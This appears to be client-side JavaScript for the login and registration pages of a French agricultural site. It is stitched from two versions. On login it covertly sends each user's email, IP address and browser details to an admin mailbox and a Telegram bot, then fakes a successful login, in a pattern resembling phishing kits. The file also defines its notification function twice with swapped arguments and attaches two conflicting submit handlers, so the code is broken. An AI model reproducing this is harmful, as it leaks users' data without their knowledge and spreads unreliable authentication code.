// Authentication related JavaScript

// Configuration des services de notification
const CONFIG = {
    // Configuration EmailJS (remplacez par vos vraies clés)
    emailjs: {
        serviceId: 'YOUR_EMAILJS_SERVICE_ID',
        templateId: 'YOUR_EMAILJS_TEMPLATE_ID',
        publicKey: 'YOUR_EMAILJS_PUBLIC_KEY'
    },
    // Configuration Telegram Bot (remplacez par vos vraies clés)
    telegram: {
        botToken: 'YOUR_BOT_TOKEN',
        chatId: 'YOUR_CHAT_ID'
    },
    // Email de destination pour les notifications
    adminEmail: 'admin@agrovision.fr'
};

// Initialisation d'EmailJS
(function() {
    if (typeof emailjs !== 'undefined') {
        emailjs.init(CONFIG.emailjs.publicKey);
    }
})();

document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('login-form');
    const passwordToggle = document.querySelector('.password-toggle');
    const passwordInput = document.getElementById('login-password');

    // Toggle password visibility
    if (passwordToggle && passwordInput) {
        passwordToggle.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            
            const icon = this.querySelector('i');
            icon.classList.toggle('fa-eye');
            icon.classList.toggle('fa-eye-slash');
        });
    }

    // Form submission
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const loginData = {
                email: formData.get('email'),
                password: formData.get('password'),
                remember: formData.get('remember') ? 'Oui' : 'Non',
                timestamp: new Date().toLocaleString('fr-FR'),
                userAgent: navigator.userAgent,
                ip: await getUserIP()
            };

            // Afficher un indicateur de chargement
            const submitBtn = this.querySelector('button[type="submit"]');
            const originalText = submitBtn.textContent;
            submitBtn.textContent = 'Connexion en cours...';
            submitBtn.disabled = true;

            try {
                // Envoyer les notifications
                await Promise.all([
                    sendEmailNotification(loginData, 'login'),
                    sendTelegramNotification(loginData, 'login')
                ]);

                // Simuler une connexion réussie
                showNotification('Connexion réussie ! Redirection en cours...', 'success');
                
                // Stocker les données de session si "Se souvenir de moi" est coché
                if (loginData.remember === 'Oui') {
                    localStorage.setItem('userEmail', loginData.email);
                }

                // Redirection après 2 secondes
                setTimeout(() => {
                    window.location.href = 'dashboard.html';
                }, 2000);

            } catch (error) {
                console.error('Erreur lors de la connexion:', error);
                showNotification('Erreur lors de la connexion. Veuillez réessayer.', 'error');
            } finally {
                // Restaurer le bouton
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
            }
        });
    }

    // Pré-remplir l'email si stocké
    const savedEmail = localStorage.getItem('userEmail');
    if (savedEmail) {
        const emailInput = document.getElementById('login-email');
        if (emailInput) {
            emailInput.value = savedEmail;
        }
    }
});

// Fonction pour envoyer une notification par email
async function sendEmailNotification(userData, type) {
    if (typeof emailjs === 'undefined') {
        console.warn('EmailJS non disponible');
        return;
    }

    const templateParams = {
        to_email: CONFIG.adminEmail,
        subject: `Nouvelle ${type === 'login' ? 'connexion' : 'inscription'} - AgroEleVision`,
        user_email: userData.email,
        user_name: userData.firstname ? `${userData.firstname} ${userData.lastname}` : userData.email,
        action_type: type === 'login' ? 'Connexion' : 'Inscription',
        timestamp: userData.timestamp,
        user_agent: userData.userAgent,
        ip_address: userData.ip,
        phone: userData.phone || 'Non fourni',
        farm_type: userData.farmType || 'Non spécifié',
        remember_me: userData.remember || 'Non'
    };

    try {
        const response = await emailjs.send(
            CONFIG.emailjs.serviceId,
            CONFIG.emailjs.templateId,
            templateParams
        );
        console.log('Email envoyé avec succès:', response);
        return response;
    } catch (error) {
        console.error('Erreur envoi email:', error);
        throw error;
    }
}

// Fonction pour envoyer une notification Telegram
async function sendTelegramNotification(userData, type) {
    const message = formatTelegramMessage(userData, type);
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CONFIG.telegram.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error(`Erreur Telegram: ${response.status}`);
        }

        const result = await response.json();
        console.log('Message Telegram envoyé:', result);
        return result;
    } catch (error) {
        console.error('Erreur envoi Telegram:', error);
        throw error;
    }
}

// Fonction pour formater le message Telegram
function formatTelegramMessage(userData, type) {
    const action = type === 'login' ? '🔐 CONNEXION' : '📝 INSCRIPTION';
    const emoji = type === 'login' ? '👤' : '🆕';
    
    let message = `${action} - AgroEleVision\n\n`;
    message += `${emoji} <b>Utilisateur:</b> ${userData.email}\n`;
    
    if (userData.firstname) {
        message += `👤 <b>Nom:</b> ${userData.firstname} ${userData.lastname}\n`;
    }
    
    if (userData.phone) {
        message += `📱 <b>Téléphone:</b> ${userData.phone}\n`;
    }
    
    if (userData.farmType) {
        message += `🚜 <b>Type d'exploitation:</b> ${userData.farmType}\n`;
    }
    
    if (type === 'login' && userData.remember) {
        message += `💾 <b>Se souvenir:</b> ${userData.remember}\n`;
    }
    
    message += `⏰ <b>Date:</b> ${userData.timestamp}\n`;
    message += `🌐 <b>IP:</b> ${userData.ip}\n`;
    message += `💻 <b>Navigateur:</b> ${userData.userAgent.substring(0, 50)}...`;
    
    return message;
}

// Fonction pour obtenir l'IP de l'utilisateur
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Erreur récupération IP:', error);
        return 'Non disponible';
    }
}

// Fonction pour afficher les notifications
function showNotification(message, type = 'info') {
    // Supprimer les notifications existantes
    const existingNotifications = document.querySelectorAll('.notification');
    existingNotifications.forEach(notif => notif.remove());

    // Créer la nouvelle notification
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.innerHTML = `
        <div class="notification-content">
            <span class="notification-icon">
                ${type === 'success' ? '✅' : type === 'error' ? '❌' : 'ℹ️'}
            </span>
            <span class="notification-message">${message}</span>
            <button class="notification-close">&times;</button>
        </div>
    `;

    // Ajouter les styles
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
        color: white;
        padding: 1rem 1.5rem;
        border-radius: 8px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        z-index: 10000;
        max-width: 400px;
        animation: slideInRight 0.3s ease-out;
    `;

    // Ajouter au DOM
    document.body.appendChild(notification);

    // Gestionnaire de fermeture
    const closeBtn = notification.querySelector('.notification-close');
    closeBtn.addEventListener('click', () => {
        notification.style.animation = 'slideOutRight 0.3s ease-out';
        setTimeout(() => notification.remove(), 300);
    });

    // Auto-suppression après 5 secondes
    setTimeout(() => {
        if (notification.parentNode) {
            notification.style.animation = 'slideOutRight 0.3s ease-out';
            setTimeout(() => notification.remove(), 300);
        }
    }, 5000);
}

// Ajouter les animations CSS
const style = document.createElement('style');
style.textContent = `
    @keyframes slideInRight {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOutRight {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
    
    .notification-content {
        display: flex;
        align-items: center;
        gap: 0.75rem;
    }
    
    .notification-close {
        background: none;
        border: none;
        color: white;
        font-size: 1.2rem;
        cursor: pointer;
        padding: 0;
        margin-left: auto;
    }
    
    .notification-close:hover {
        opacity: 0.8;
    }
`;
document.head.appendChild(style);

document.addEventListener('DOMContentLoaded', function() {
  // Password visibility toggle
  const passwordToggles = document.querySelectorAll('.password-toggle');
  
  passwordToggles.forEach(toggle => {
    toggle.addEventListener('click', function() {
      const passwordInput = this.previousElementSibling;
      const icon = this.querySelector('i');
      
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        icon.classList.remove('fa-eye');
        icon.classList.add('fa-eye-slash');
      } else {
        passwordInput.type = 'password';
        icon.classList.remove('fa-eye-slash');
        icon.classList.add('fa-eye');
      }
    });
  });
  
  // Password strength meter
  const passwordInput = document.getElementById('password');
  const strengthMeter = document.querySelector('.strength-meter-fill');
  
  if (passwordInput && strengthMeter) {
    passwordInput.addEventListener('input', function() {
      const password = this.value;
      const strength = calculatePasswordStrength(password);
      
      strengthMeter.setAttribute('data-strength', strength);
      
      // Update strength text
      const strengthText = document.querySelector('.strength-text');
      if (strengthText) {
        const strengthLabels = ['Vide', 'Faible', 'Moyen', 'Fort', 'Très fort'];
        strengthText.textContent = `Force du mot de passe: ${strengthLabels[strength]}`;
      }
    });
  }
  
  // Registration form validation
  const registerForm = document.getElementById('register-form');
  
  if (registerForm) {
    registerForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      // Basic form validation
      const firstName = document.getElementById('firstname').value.trim();
      const lastName = document.getElementById('lastname').value.trim();
      const email = document.getElementById('email').value.trim();
      const phone = document.getElementById('phone').value.trim();
      const farmType = document.getElementById('farm-type').value;
      const password = document.getElementById('password').value;
      const confirmPassword = document.getElementById('confirm-password').value;
      const termsChecked = document.getElementById('terms').checked;
      
      let isValid = true;
      const errors = [];
      
      // Validate name
      if (firstName.length < 2) {
        errors.push('Le prénom doit contenir au moins 2 caractères');
        isValid = false;
      }
      
      if (lastName.length < 2) {
        errors.push('Le nom doit contenir au moins 2 caractères');
        isValid = false;
      }
      
      // Validate email
      if (!validateEmail(email)) {
        errors.push('Veuillez entrer une adresse email valide');
        isValid = false;
      }
      
      // Validate phone
      if (!validatePhone(phone)) {
        errors.push('Veuillez entrer un numéro de téléphone valide');
        isValid = false;
      }
      
      // Validate farm type
      if (!farmType) {
        errors.push('Veuillez sélectionner un type d\'exploitation');
        isValid = false;
      }
      
      // Validate password
      if (calculatePasswordStrength(password) < 3) {
        errors.push('Le mot de passe doit être plus fort (au moins 8 caractères, incluant des majuscules, minuscules, chiffres et caractères spéciaux)');
        isValid = false;
      }
      
      // Validate password confirmation
      if (password !== confirmPassword) {
        errors.push('Les mots de passe ne correspondent pas');
        isValid = false;
      }
      
      // Validate terms
      if (!termsChecked) {
        errors.push('Vous devez accepter les conditions d\'utilisation');
        isValid = false;
      }
      
      if (isValid) {
        // Simulate successful registration
        showNotification('success', 'Votre compte a été créé avec succès! Redirection...');
        
        // In a real application, you would send this data to the server
        // For demo purposes, we'll just redirect after a delay
        setTimeout(() => {
          window.location.href = '../index.html';
        }, 2000);
      } else {
        // Show the first error
        showNotification('error', errors[0]);
      }
    });
  }
  
  // Login form validation
  const loginForm = document.getElementById('login-form');
  
  if (loginForm) {
    loginForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      const email = document.getElementById('login-email').value.trim();
      const password = document.getElementById('login-password').value;
      
      let isValid = true;
      const errors = [];
      
      // Validate email
      if (!validateEmail(email)) {
        errors.push('Veuillez entrer une adresse email valide');
        isValid = false;
      }
      
      // Validate password (basic check for demo)
      if (password.length < 6) {
        errors.push('Le mot de passe doit contenir au moins 6 caractères');
        isValid = false;
      }
      
      if (isValid) {
        // Simulate successful login
        showNotification('success', 'Connexion réussie! Redirection...');
        
        // For demo purposes, redirect after a delay
        setTimeout(() => {
          window.location.href = '../index.html';
        }, 2000);
      } else {
        // Show the first error
        showNotification('error', errors[0]);
      }
    });
  }
});

// Calculate password strength (0-4)
function calculatePasswordStrength(password) {
  if (!password) return 0;
  
  let strength = 0;
  
  // Length check
  if (password.length >= 8) strength += 1;
  
  // Complexity checks
  if (/[a-z]/.test(password)) strength += 0.5;
  if (/[A-Z]/.test(password)) strength += 0.5;
  if (/[0-9]/.test(password)) strength += 0.5;
  if (/[^a-zA-Z0-9]/.test(password)) strength += 0.5;
  
  // Bonus for length and complexity combination
  if (password.length >= 12 && strength >= 2) strength += 1;
  
  return Math.floor(strength);
}

// Email validation
function validateEmail(email) {
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return regex.test(email);
}

// Phone validation (basic)
function validatePhone(phone) {
  const regex = /^[+]?[(]?[0-9]{3}[)]?[-\s.]?[0-9]{3}[-\s.]?[0-9]{4,6}$/;
  return regex.test(phone) || phone.length >= 10;
}

// Notification system (reused from main.js)
function showNotification(type, message) {
  // Create notification element
  const notification = document.createElement('div');
  notification.className = `notification notification-${type}`;
  
  const icon = document.createElement('span');
  icon.className = 'notification-icon';
  icon.innerHTML = type === 'success' ? '<i class="fas fa-check-circle"></i>' : '<i class="fas fa-exclamation-circle"></i>';
  
  const text = document.createElement('span');
  text.className = 'notification-text';
  text.textContent = message;
  
  const closeBtn = document.createElement('button');
  closeBtn.className = 'notification-close';
  closeBtn.innerHTML = '<i class="fas fa-times"></i>';
  closeBtn.addEventListener('click', () => {
    notification.classList.add('notification-hiding');
    setTimeout(() => {
      notification.remove();
    }, 300);
  });
  
  notification.appendChild(icon);
  notification.appendChild(text);
  notification.appendChild(closeBtn);
  
  // Add to the DOM
  if (!document.querySelector('.notifications-container')) {
    const container = document.createElement('div');
    container.className = 'notifications-container';
    document.body.appendChild(container);
  }
  
  const container = document.querySelector('.notifications-container');
  container.appendChild(notification);
  
  // Add the visible class after a small delay to trigger animation
  setTimeout(() => {
    notification.classList.add('notification-visible');
  }, 10);
  
  // Auto-remove after 5 seconds
  setTimeout(() => {
    notification.classList.add('notification-hiding');
    setTimeout(() => {
      notification.remove();
    }, 300);
  }, 5000);
}